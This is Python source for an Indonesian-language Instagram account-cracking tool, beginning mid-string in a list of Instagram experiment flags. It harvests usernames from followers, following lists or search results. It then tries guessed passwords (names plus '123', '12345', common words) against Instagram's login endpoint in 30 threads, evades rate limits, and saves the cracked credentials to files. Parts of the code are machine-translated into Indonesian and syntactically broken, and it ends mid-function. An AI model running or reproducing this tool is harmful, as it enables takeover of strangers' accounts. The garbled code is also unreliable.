ig_android_direct_thread_message_animation, ig_android_draw_rainbow_client_universe, ig_android_direct_link_style, ig_android_live_heart_enhancements_universe, ig_android_rtc_reshare, ig_android_preload_item_count_in_reel_viewer_buffer, ig_android_users_bootstrap_service, ig_android_auto_retry_post_mode, ig_android_shopping, ig_android_main_feed_seen_state_dont_send_info_on_tail_load, ig_fbns_preload_default, ig_android_gesture_dismiss_reel_viewer, ig_android_tool_tip,ig_android_ad_logger_funnel_logging_universe, ig_android_gallery_grid_column_count_universe, ig_android_business_new_ads_payment_universe, ig_android_direct_links, ig_android_audience_control, ig_android_live_encore_consumption_settings_universe, ig_perf_android_holdout, ig_android_cache_contact_import_list, ig_android_links_receivers, ig_android_ad_impression_backtest, ig_android_list_redesign, ig_android_stories_separate_overlay_creation, ig_android_stop_video_recording_fix_universe, ig_android_render_video_segmentation, ig_android_live_encore_reel_chaining_universe, ig_android_sync_on_background_enhanced_10_25, ig_android_immersive_viewer, ig_android_mqtt_skywalker, ig_fbns_push, ig_android_ad_watchmore_overlay_universe, ig_android_react_native_universe, ig_android_profile_tabs_redesign_universe, ig_android_live_consumption_abr, ig_android_story_viewer_social_context,ig_android_hide_post_in_feed, ig_android_video_loopcount_int, ig_android_enable_main_feed_reel_tray_preloading, ig_android_camera_upsell_dialog, ig_android_ad_watchbrowse_universe, ig_android_internal_research_settings, ig_android_search_people_tag_universe, ig_android_react_native_ota, ig_android_enable_concurrent_request, ig_android_react_native_stories_grid_view, ig_android_business_stories_inline_insights, ig_android_log_mediacodec_info, ig_android_direct_expiring_media_loading_errors, ig_video_use_sve_universe, ig_android_cold_start_feed_request, ig_android_enable_zero_rating, ig_android_reverse_audio, ig_android_branded_content_three_line_ui_universe, ig_android_live_encore_production_universe, ig_stories_music_sticker, ig_android_stories_teach_gallery_location, ig_android_http_stack_experiment_2017, ig_android_stories_device_tilt,ig_android_pending_request_search_bar, ig_android_fb_topsearch_sgp_fork_request, ig_android_seen_state_with_view_info, ig_android_animation_perf_reporter_timeout, ig_android_new_block_flow, ig_android_story_tray_title_play_all_v2, ig_android_direct_address_links, ig_android_stories_archive_universe, ig_android_save_collections_cover_photo, ig_android_live_webrtc_livewith_production, ig_android_sign_video_url, ig_android_stories_video_prefetch_kb, ig_android_stories_create_flow_favorites_tooltip, ig_android_live_stop_broadcast_on_404, ig_android_live_viewer_invite_universe, ig_android_promotion_feedback_channel, ig_android_render_iframe_interval, ig_android_accessibility_logging_universe, ig_android_camera_shortcut_universe, ig_android_use_one_cookie_store_per_user_override, ig_profile_holdout_2017_universe, ig_android_stories_server_brushes,ig_android_ad_media_url_logging_universe, ig_android_shopping_tag_nux_text_universe, ig_android_comments_single_reply_universe, ig_android_stories_video_loading_spinner_improvements, ig_android_collections_cache, ig_android_comment_api_spam_universe, ig_android_facebook_twitter_profile_photos, ig_android_shopping_tag_creation_universe, ig_story_camera_reverse_video_experiment, ig_android_direct_bump_selected_recipients, ig_android_ad_cta_haptic_feedback_universe, ig_android_vertical_share_sheet_experiment, ig_android_family_bridge_share, ig_android_search, ig_android_insta_video_consumption_titles, ig_android_stories_gallery_preview_button, ig_android_fb_auth_education, ig_android_camera_universe, ig_android_me_only_universe, ig_android_instavideo_audio_only_mode, ig_android_user_profile_chaining_icon, ig_android_live_video_reactions_consumption_universe,ig_android_stories_hashtag_text, ig_android_post_live_badge_universe, ig_android_swipe_fragment_container, ig_android_search_users_universe, ig_android_live_save_to_camera_roll_universe, ig_creation_growth_holdout, ig_android_sticker_region_tracking, ig_android_unified_inbox, ig_android_live_new_watch_time, ig_android_offline_main_feed_10_11, ig_import_biz_contact_to_page, ig_android_live_encore_consumption_universe, ig_android_experimental_filters, ig_android_search_client_matching_2, ig_android_react_native_inline_insights_v2, ig_android_business_conversion_value_prop_v2, ig_android_redirect_to_low_latency_universe, ig_android_ad_show_new_awr_universe, ig_family_bridges_holdout_universe, ig_android_background_explore_fetch, ig_android_following_follower_social_context, ig_android_video_keep_screen_on, ig_android_ad_leadgen_relay_modern,ig_android_profile_photo_as_media, ig_android_insta_video_consumption_infra, ig_android_ad_watchlead_universe, ig_android_direct_prefetch_direct_story_json, ig_android_shopping_react_native, ig_android_top_live_profile_pics_universe, ig_android_direct_phone_number_links, ig_android_stories_weblink_creation, ig_android_direct_search_new_thread_universe, ig_android_histogram_reporter, ig_android_direct_on_profile_universe, ig_android_network_cancellation, ig_android_background_reel_fetch, ig_android_react_native_insights, ig_android_insta_video_audio_encoder, ig_android_family_bridge_bookmarks, ig_android_data_usage_network_layer, ig_android_universal_instagram_deep_links, ig_android_dash_for_vod_universe, ig_android_modular_tab_discover_people_redesign, ig_android_mas_sticker_upsell_dialog_universe, ig_android_ad_add_per_event_counter_to_logging_event,ig_android_sticky_header_top_chrome_optimization, ig_android_rtl, ig_android_biz_conversion_page_pre_select, ig_android_promote_from_profile_button, ig_android_live_broadcaster_invite_universe, ig_android_share_spinner, ig_android_text_action, ig_android_own_reel_title_universe, ig_promotions_unit_in_insights_landing_page, ig_android_business_settings_header_univ, ig_android_save_longpress_tooltip, ig_android_constrain_image_size_universe, ig_android_business_new_graphql_endpoint_universe, ig_ranking_following, ig_android_stories_profile_camera_entry_point, ig_android_universe_reel_video_production, ig_android_power_metrics, ig_android_sfplt, ig_android_offline_hashtag_feed, ig_android_live_skin_smooth, ig_android_direct_inbox_search, ig_android_stories_posting_offline_ui, ig_android_sidecar_video_upload_universe, ig_android_promotion_manager_entry_point_universe,ig_android_direct_reply_audience_upgrade, ig_android_swipe_navigation_x_angle_universe, ig_android_offline_mode_holdout, ig_android_live_send_user_location, ig_android_direct_fetch_before_push_notif, ig_android_non_square_first, ig_android_insta_video_drawing, ig_android_swipeablefilters_universe, ig_android_live_notification_control_universe, ig_android_analytics_logger_running_background_universe, ig_android_save_all, ig_android_reel_viewer_data_buffer_size, ig_direct_quality_holdout_universe, ig_android_family_bridge_discover, ig_android_react_native_restart_after_error_universe, ig_android_startup_manager, ig_story_tray_peek_content_universe, ig_android_profile, ig_android_high_res_upload_2, ig_android_http_service_same_thread, ig_android_scroll_to_dismiss_keyboard, ig_android_remove_followers_universe, ig_android_skip_video_render, ig_android_story_timestamps,ig_android_live_viewer_comment_prompt_universe, ig_profile_holdout_universe, ig_android_react_native_insights_grid_view, ig_stories_selfie_sticker, ig_android_stories_reply_composer_redesign, ig_android_streamline_page_creation, ig_explore_netego, ig_android_ig4b_connect_fb_button_universe, ig_android_feed_util_rect_optimization, ig_android_rendering_controls, ig_android_os_version_blocking, ig_android_encoder_width_safe_multiple_16, ig_search_new_bootstrap_holdout_universe, ig_android_snippets_profile_nux, ig_android_e2e_optimization_universe, ig_android_comments_logging_universe, ig_shopping_insights, ig_android_save_collections, ig_android_live_see_fewer_videos_like_this_universe, ig_android_show_new_contact_import_dialog, ig_android_live_view_profile_from_comments_universe, ig_fbns_blocked, ig_formats_and_feedbacks_holdout_universe,ig_android_reduce_view_pager_buffer, ig_android_instavideo_periodic_notif, ig_search_user_auto_complete_cache_sync_ttl, ig_android_marauder_update_frequency, ig_android_suggest_password_reset_on_oneclick_login, ig_android_promotion_entry_from_ads_manager_universe, ig_android_live_special_codec_size_list, ig_android_enable_share_to_messenger, ig_android_background_main_feed_fetch, ig_android_live_video_reactions_creation_universe, ig_android_channels_home, ig_android_sidecar_gallery_universe, ig_android_upload_reliability_universe, ig_migrate_mediav2_universe, ig_android_insta_video_broadcaster_infra_perf, ig_android_business_conversion_social_context, android_ig_fbns_kill_switch, ig_android_live_webrtc_livewith_consumption, ig_android_destroy_swipe_fragment, ig_android_react_native_universe_kill_switch, ig_android_stories_book_universe,ig_android_all_videoplayback_persisting_sound, ig_android_draw_eraser_universe, ig_direct_search_new_bootstrap_holdout_universe, ig_android_cache_layer_bytes_threshold, ig_android_search_hash_tag_and_username_universe, ig_android_business_promotion, ig_android_direct_search_recipients_controller_universe, ig_android_ad_show_full_name_universe, ig_android_anrwatchdog, ig_android_qp_kill_switch, ig_android_2fac, ig_direct_bypass_group_size_limit_universe, ig_android_promote_simplified_flow, ig_android_share_to_whatsapp, ig_android_hide_bottom_nav_bar_on_discover_people, ig_fbns_dump_ids, ig_android_hands_free_before_reverse, ig_android_skywalker_live_event_start_end, ig_android_live_join_comment_ui_change, ig_android_direct_search_story_recipients_universe, ig_android_direct_full_size_gallery_upload, ig_android_ad_browser_gesture_control, ig_channel_server_experiments,ig_android_video_cover_frame_from_original_as_fallback, ig_android_ad_watchinstall_universe, ig_android_ad_viewability_logging_universe, ig_android_new_optic, ig_android_direct_visual_replies, ig_android_stories_search_reel_mentions_universe, ig_android_threaded_comments_universe, ig_android_mark_reel_seen_on_Swipe_forward, ig_internal_ui_for_lazy_loaded_modules_experiment, ig_fbns_shared, ig_android_capture_slowmo_mode, ig_android_live_viewers_list_search_bar, ig_android_video_single_surface, ig_android_offline_reel_feed, ig_android_video_download_logging, ig_android_last_edits, ig_android_exoplayer_4142, ig_android_post_live_viewer_count_privacy_universe, ig_android_activity_feed_click_state, ig_android_snippets_haptic_feedback, ig_android_gl_drawing_marks_after_undo_backing, ig_android_mark_seen_state_on_viewed_impression,ig_android_live_backgrounded_reminder_universe, ig_android_live_hide_viewer_nux_universe, ig_android_live_monotonic_pts, ig_android_search_top_search_surface_universe, ig_android_user_detail_endpoint, ig_android_location_media_count_exp_ig, ig_android_comment_tweaks_universe, ig_android_ad_watchmore_entry_point_universe, ig_android_top_live_notification_universe, ig_android_add_to_last_post, ig_save_insights, ig_android_live_enhanced_end_screen_universe, ig_android_ad_add_counter_to_logging_event, ig_android_blue_token_conversion_universe, ig_android_exoplayer_settings, ig_android_progressive_jpeg, ig_android_offline_story_stickers, ig_android_gqls_typing_indicator, ig_android_chaining_button_tooltip, ig_android_video_prefetch_for_connectivity_type, ig_android_use_exo_cache_for_progressive, ig_android_samsung_app_badging, ig_android_ad_holdout_watchandmore_universe,ig_android_offline_commenting,ig_direct_stories_recipient_picker_button,ig_insights_feedback_channel_universe,ig_android_insta_video_abr_resize,ig_android_insta_video_sound_always_on''
	SIG_KEY_VERSION = '4'

	def __init__(diri sendiri, nama pengguna, kata sandi):
		self.namapengguna=namapengguna
		self.password=password
		m = hashlib.md5()
		m.update(namapengguna.encode('utf-8') + sandi.encode('utf-8'))
		self.device_id = self.generateDeviceId(m.hexdigest())
		self.uuid = self.generateUUID(Benar)
		diri.s = permintaan.Sesi()

	def generateDeviceId(self, seed):
		volatile_seed = "12345"
		m = hashlib.md5()
		m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
		kembalikan 'android-' + m.hexdigest()[:16]

	def generateUUID(sendiri, ketik):
		generate_uuid = str(uuid.uuid4())
		jika (tipe):
			kembalikan generate_uuid
		lain:
			kembalikan generate_uuid.replace('-', '')

	def loginAPI (sendiri):
		token=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).text
		crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
		self.s.headers.update({'Connection': 'close',
			'Menerima': '*/*',
			'Content-type': 'application/x-www-form-urlencoded; rangkaian karakter=UTF-8',
			'Cookie2': '$Versi=1',
			'Bahasa Terima': 'en-US',
			'User-Agent': user_agentAPI()})
		self.data = json.dumps({
			'phone_id': self.generateUUID(Benar),
			'_csrftoken': crf_token,
			'nama pengguna': self.namapengguna,
			'panduan': self.uuid,
			'device_id': self.device_id,
			'kata sandi': self.password,
			'login_attempt_count': '0'})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(Salah),
			urllib.request.quote(self.data)
		)
		x=self.s.post("https://i.instagram.com/api/v1/accounts/login/", self.payload)
		x_jason=json.loads(x.teks)
		x_kukis=x.cookies.get_dict()
		jika "log_in_user" di x.text:
			kuki=";".join([v+"="+x_kukis[v] untuk v di x_kukis])
			#id=x_jason['log_in_user']['pk']
			#nm=x_jason['log_in_user']['nama_lengkap']
			#pn=x_jason['logged_in_user']['phone_number']
			kembali {'status':'success','cookie':kuki,'userrame':self.username}
		elif 'challenge_required' di x.text:
			kembalikan {'status':'checkpoint'}
		lain:
			kembalikan {'status':'login_error'}
C = ''
instagram kelas:
	def __init__(sendiri, eksternal, nama pengguna, cookie):
		self.ext=eksternal
		self.namapengguna=namapengguna
		self.cookie=kue
		self.s=requests.Session()

	def logo(self):
		os.system('clear')
		for i in external:
			try:
				nama=i.split('|')[0]
				followers=i.split('|')[1]
				following=i.split('|')[2]
			except:
				pass
		banner()
		print(f"""
{U}•{P} 01 {O}Crack dari pengikut
{U}•{P} 02 {O}Crack dari mengikuti
{U}•{P} 03 {O}Crack dari pencarian nama
{U}•{P} 04 {O}Crack secara target 
{U}•{P} 05 {O}Cek status akun hasil crack
{U}•{P} 06 {O}Bot auto unfollow
{U}•{P} rm {O}Hapus akun
{U}•{M} 00 {O}Keluar
	""")
	
	def menu(self):
		self.logo()
		c=input('%s# %sPilih %s> %s'%(P,O,M,K))
		if c=='':
			print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			self.menu()
		elif c in ('1','01'):
			print ("\n%s%s %sPerlu di ingat target harus bersifat publik "%(U,til,O))
			m=input('%s%s %sUsername target%s > %s'%(U,til,O,M,K))
			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
			self.passwordAPI(info)
		elif c in ('2','02'):
			print ("\n%s%s %sPerlu di ingat target harus bersifat publik "%(U,til,O))
			m=input('%s%s %sUsername target%s > %s'%(U,til,O,M,K))
			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
			self.passwordAPI(info)
		elif c in ('3','03'):
			print ("\n%s%s %sSemakin banyak target semakin banyak id yg terkumpul "%(U,til,O))
			m=int(input('%s%s %sJumlah target%s > %s'%(U,til,O,M,K)))
			print('')
			for i in range(m):
				i+=1
				nama=input('%s•%s %s %sMasukan nama%s > %s'%(U,P,i,O,M,K))
				name=self.searchAPI(self.cookie,nama)
			print ('')
			self.passwordAPI(name)
		elif c in ('4','04'):
			crack_target()
			exit()
		elif c in ('5','05'):
			print('')
			for i in os.listdir('IG'):
				print("%s•%s> %s%s"%(U,M,J,i));jeda(0.07)
			c=input("\n%s•%s masukan file %s:%s "%(U,O,M,K))
			g=open("IG/%s"%(c)).read().splitlines()
			print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
			print('%s%s%s Total akun %s: %s%s '%(U,til,O,M,H,len(g)))
			print(" %s# %s---------------------------------------- %s#%s"%(P,M,P,K));jeda(2)
			print("\n%s•%s Mohon tunggu sedang mengecek akun ... "%(U,O))
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				self.checkAPI(usr,pwd)
			exit("\n%s%s%s Selesai mengecek akun"%(U,til,O));jeda(0.07)
		elif c in ('6','06'):
			global following
			six=0
			print ("\n%s%s %sBot unfollow-All di jalankan "%(U,til,O))
			x=open('.kukis.log','r').read()
			x_id=re.findall('sessionid=(\d+)',x)[0]
			back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
			for i in following:
				six+=1
				sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
				six_id=self.sixAPI(i)
				print (f"{U}{til}{O} {str(six)} {i} {H}Unfollow berhasil √")
				self.unfollowAPI(six_id,'5452333948',self.cookie)
				#print(w)
			exit(f'\n {H}√ unfollow selesai ...')
			self.menu()
		elif c in ('rm','RM','Rm'):
			os.remove('.kukis.log')
			os.remove('.username')
			jalan ("\n%s%s berhasil menghapus data login "%(M,til))
			exit()
		elif c in ('0','00'):
			exit()
		else:
			print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			self.menu()

	def sixAPI(self,six_id):
		url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
		x = requests.get(url)
		x_jason = x.json()
		uid = str( x_jason['users'][0].get("user").get("pk") )
		return uid

	def unfollowAPI(self,user_id,username_id,cookie):
		uuid=generateUUID(True)
		xx=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
		crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
		s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': User_Agent()})
		data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(data))
		return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text

	def searchAPI(self,cookie,nama):
		try:
			x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
			x_jason=json.loads(x.text)
			for i in x_jason['users']:
				user=i['user']
				username=user['username']
				fullname=user['full_name']
				internal.append(f'{username}|{fullname}')
		except requests.exceptions.ConnectionError:
			exit('\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		return internal

	def idAPI(self,cookie,id):
		try:
			m=s.get('https://www.instagram.com/%s/?__a=1'%(id),cookies=cookie,headers={"user-agent":USN})
			m_jason=m.json()["graphql"]["user"]
			idx=m_jason["id"]
		except requests.exceptions.ConnectionError:
			exit('\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		except Exception as e:
			exit('\n%s%s username yg anda masukan salah pastikan target bersifat publik%s\n'%(M,til,N))
		return idx

	def infoAPI(self,cookie,api,id):
		try:
			x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
			x_jason=json.loads(x.text)
			for i in x_jason['users']:
				username = i["username"]
				nama = i["full_name"]
				internal.append(f'{username}|{nama}')
				following.append(username)
		except requests.exceptions.ConnectionError:
			exit('\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		except Exception as e:
			exit('\n%s%s username yg anda masukan salah pastikan target bersifat publik%s\n'%(M,til,N))
		return internal

	def passwordAPI(self,xnx):
		print ("\r%s•%s Total user %s> %s%s"%(U,O,M,H,len(internal)))
		print(f"""
{U}{til}{O} [ {U}pilih methode crack, silahkan coba satu²{O} ]

{U}{til}{P} 01 {O}Methode {M}V.1 {O}(fast)
{U}{til}{P} 02 {O}Methode {P}V.2 {O}(slow)
{U}{til}{P} 03 {O}Methode {H}V.3 {O}(very slow)
		""")
		c=input('%s# %sPilih %s> %s'%(P,O,M,K))
		if c=='1':
			self.generateAPI(xnx,c)
		elif c=='2':
			self.generateAPI(xnx,c)
		elif c=='3':
			self.generateAPI(xnx,c)
		else:
			self.passwordAPI(xnx)

	def generateAPI(self,user,o):
		print(f"""
{U}{til}{O} [ {U}pilih user-agent, silahkan coba satu²{O} ]

{U}{til}{P} 01 {O}User-Agent 1
{U}{til}{P} 02 {O}User-Agent 2
{U}{til}{P} 03 {O}User-Agent 3
		""")
		ua=input('%s# %sPilih %s> %s'%(P,O,M,K))
		if ua=='1':
			uaAPI=User_Agent()
		elif ua=='2':
			uaAPI=user_agent()
		elif ua=='3':
			uaAPI=user_agentAPI()
		print(f"""
{U}{til}{O} akun {H}[OK] {O}tersimpan ke file {M}> {H}IG/OK-{day}.txt
{U}{til}{O} akun {M}[{K}CP{M}] {O}tersimpan ke file {M}> {K}IG/CP-{day}.txt
{U}!{O} setiap crack 1k ID, mainkan mode pesawat 3 detik
		""")
		with ThreadPoolExecutor(max_workers=30) as shinkai:
			for i in user:
				try:
					username=i.split("|")[0]
					password=i.split("|")[1].lower()
					for w in password.split(" "):
						if len(w)<3:
							continue
						else:
							w=w.lower()
							if o=="1":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w+'123',w+'12345']
								else:
									sandi=[w+'123',w+'12345']
							elif o=="2":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w,w+'123',w+'12345']
								else:
									sandi=[w,w+'123',w+'12345']
							elif o=="3":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w,w+'123',w+'12345',w,password.lower()]
								else:
									sandi=[w,w+'123',w+'12345',w,password.lower()]
							shinkai.submit(self.crackAPI,username,sandi,uaAPI)
				except:
					pass
		
		os.popen('play-audio data/selesai.mp3')
		exit("\n%s√ finished"%(H))

	def APIinfo(self,user):
		try:
			x=s.get("https://www.instagram.com/%s/?__a=1"%(user),headers={"user-agent":USN})
			x_jason=x.json()["graphql"]["user"]
			nama=x_jason["full_name"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		except:
			pass
		return nama,pengikut,mengikut,postingan

	def crackAPI(self,user,pas,uaAPI):
		global loop,success,checkpoint
		warna = random.choice([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;96m [crack] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s%s%s]    '%(loop,len(internal),H,M,H,len(success),O,K,M,K,len(checkpoint),O)),
		sys.stdout.flush()
		try:
			for pw in pas:
				token=s.get('https://www.instagram.com/accounts/login/')
				headers = {
					'Host': 'www.instagram.com',
					'User-Agent': uaAPI,
					'Accept': '/',
					'Accept-Language': 'id,en-US;q=0.7,en;q=0.3',
					'Accept-Encoding': 'gzip, deflate, br',
					'X-CSRFToken': token.cookies['csrftoken'],
					'X-Instagram-AJAX': '1d6caaf37cd2',
					'X-IG-App-ID': '936619743392459',
					'X-ASBD-ID': '437806',
					'X-IG-WWW-Claim': '0',
					'Content-Type': 'application/x-www-form-urlencoded',
					'X-Requested-With': 'XMLHttpRequest',
					'Content-Length': '347',
					'Origin': 'https://www.instagram.com',
					'Connection': 'keep-alive',
					'Referer': 'https://www.instagram.com/accounts/login/'
				}
				param={
                    "username": user,
					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
					"optIntoOneTap": False,
					"queryParams": {},
					"stopDeletionNonce": "",
					"trustedDeviceRecords": {}}
				x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param)
				x_jason=json.loads(x.text)
				if "userId" in str(x_jason):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print(f"""\r{J}╔══[ {H}Berhasil                      
{J}║══[{H} Nama akun {M}> {H}{nama}
{J}║══[{H} Username  {M}> {H}{user}
{J}║══[{H} Password  {M}> {H}{pw}
{J}║══[{H} Followers {M}> {H}{pengikut}
{J}╚══[{H} Following {M}> {H}{mengikut}
					""")
					os.popen("play-audio dapet.mp3")
					open(f"IG/OK-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break
				elif 'checkpoint_url' in str(x_jason):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print(f"""\r{J}╔══[ {K}Checkpoint                      
{J}║══[{K} Nama akun {M}> {K}{nama}
{J}║══[{K} Username  {M}> {K}{user}
{J}║══[{K} Password  {M}> {K}{pw}
{J}║══[{K} Followers {M}> {K}{pengikut}
{J}╚══[{K} Following {M}> {K}{mengikut}
					""")
					os.popen("play-audio dapet.mp3")
					open(f"IG/CP-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif 'Harap tunggu beberapa menit sebelum mencoba lagi.' in str(x.text):
					sys.stdout.write(f"\r{M} ! terkena spam, aktifkan mode pesawat ");sys.stdout.flush();sleep(10)
					self.crackAPI(user,pas,uaAPI)
				else:
					continue
			loop+=1
		except:
			self.crackAPI(user,pas,uaAPI)

	def checkAPI(self,user,pw):
		try:
			token=s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
			crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
			s.headers.update({
				'authority': 'www.instagram.com',
				'x-ig-www-claim': 'hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h',
				'x-instagram-ajax': '82a581bb9399',
				'content-type': 'application/x-www-form-urlencoded',
				'accept': '*/*',
				'user-agent': user_agent(),
				'x-requested-with': 'XMLHttpRequest',
				'x-csrftoken': crf_token,
				'x-ig-app-id': '936619743392459',
				'origin': 'https://www.instagram.com',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'referer': 'https://www.instagram.com/',
				'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
			})
			param={
				"username": user,
				"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
				"optIntoOneTap": False,
				"queryParams": {},
				"stopDeletionNonce": "",
				"trustedDeviceRecords": {}
			}
			x=s.post("https://www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
			x_jason=json.loads(x.text)
			if "userId" in x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				print(f"""\r   
{J}╔══[ {H}Berhasil                      
{J}║══[{H} Nama akun {M}> {H}{nama}
{J}║══[{H} Username  {M}> {H}{user}
{J}║══[{H} Password  {M}> {H}{pw}
{J}║══[{H} Followers  {M}> {H}{pengikut}
{J}║══[{H} Following  {M}> {H}{mengikut}
{J}╚══[{H} Postingan  {M}> {H}{postingan}
				""")
				os.popen("play-audio dapet.mp3")
			elif 'checkpoint_url' in x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				print(f"""\r  
{J}╔══[ {K}Checkpoint                      
{J}║══[{K} Nama akun {M}> {K}{nama}
{J}║══[{K} Username  {M}> {K}{user}
{J}║══[{K} Password  {M}> {K}{pw}
{J}║══[{K} Followers  {M}> {K}{pengikut}
{J}║══[{K} Following  {M}> {K}{mengikut}
{J}╚══[{K} Postingan  {M}> {K}{postingan}
				""")
			elif 'Please wait a few minutes' in str(x.text):
				sys.stdout.write(f"\r{M} ! terkena spam, aktifkan mode pesawat ");sys.stdout.flush();sleep(10)
				self.checkAPI(user,pw)
		except:
			self.checkAPI(user,pw)
			
looping=1
def infohhh(username_dev, pass_dev, status):
	try:
		global id_, pengikut, mengikuti, nama
		da = requests.get("https://www.instagram.com/%s/?__a=1"%(user),headers={"user-agent":USN})
		data_us_dev = da.json()["graphql"]["user"]
		nama = data_us_dev["full_name"].encode("utf-8")
		id_ = data_us_dev["id"]
		pengikut = data_us_dev["edge_followed_by"]["count"]
		mengikuti = data_us_dev["edge_follow"]["count"]
	except requests.exceptions.ConnectionError:
		if status == "":
			exit("\n%s• Tidak ada koneksi internet \n"%(M))
		else:
			print ("\r%s• %s : %s > %s             \n"%(M,status,username_dev,pass_dev))
			pass
	except ValueError:
		if status == "":
			exit("\n%s• IP anda terkena spam, mode pesawat 3 detik \n"%(M))
		else:
			print ("\r%s• %s : %s > %s             \n"%(M,status,username_dev,pass_dev))
			pass
	except:
		print ("\r%s• %s : %s > %s             \n"%(M,status,username_dev,pass_dev))
		pass
		
# CRACK TARGET
def crack_target():
	pw_none = ""
	status_none = ""
	word_list = []
	word_list_crack = []
	user_target = input('\n%s%s %sUsername target%s > %s'%(U,til,O,M,K))
	time.sleep(2)
	jalan ("%s%s%s Mohon tunggu ... "%(M,til,O))
	infohhh(user_target, pw_none, status_none)
	nama_pecah = nama.split()
	angka = [123,1234,12345]
	word_list.append(nama.replace(" ", ""))
	word_list.append(nama)
	for dev in angka:
		if len(nama_pecah) >= 2:
			word_list.append(nama.replace(" ", "")+str(dev))
		if len(nama_pecah) >= 1:
			for sub_dev in nama_pecah:
				word_list.append(sub_dev)
				word_list.append(sub_dev+str(dev))
		if len(nama_pecah) >= 2:
			word_list.append(nama_pecah[0]+nama_pecah[1])
			for dev_ in angka:
				word_list.append(nama_pecah[0]+nama_pecah[1]+str(dev_))
			word_list.append(nama_pecah[1]+nama_pecah[0])
			for dev_ in angka:
				word_list.append(nama_pecah[1]+nama_pecah[0]+str(dev_))
	word_list.append(user_target)
	for iq in set(word_list):
		if len(iq) >= 6:
			word_list_crack.append(iq)
	pw_tambahan = ["sayang", "iloveyou", "bismillah", "anjing", "bangsat", "bajingan", "rahasia", "katasandi", "password", "kontol", "123456","12345678", "123456789"]
	for f in pw_tambahan:
		word_list_crack.append(f)
	print ("%s%s%s berhasil membuat kata sandi "%(U,til,O));jeda(2)
	print 
	brute(user_target, word_list_crack)
	exit()
	
def brute(email_dev, san_dev_):
	for san_dev_1 in san_dev_:
		try:
			global looping
			san_dev = san_dev_1.lower()
			with requests.Session() as dev:
				pas = q[0]
				url_scrap = "https://www.instagram.com/"
				user_agentz_api = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
				headerz = {"User-Agent": user_agentz_api}
				data = dev.get(url_scrap+post_, headers=headerz).content
				crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
				header = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": crf_token,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,}
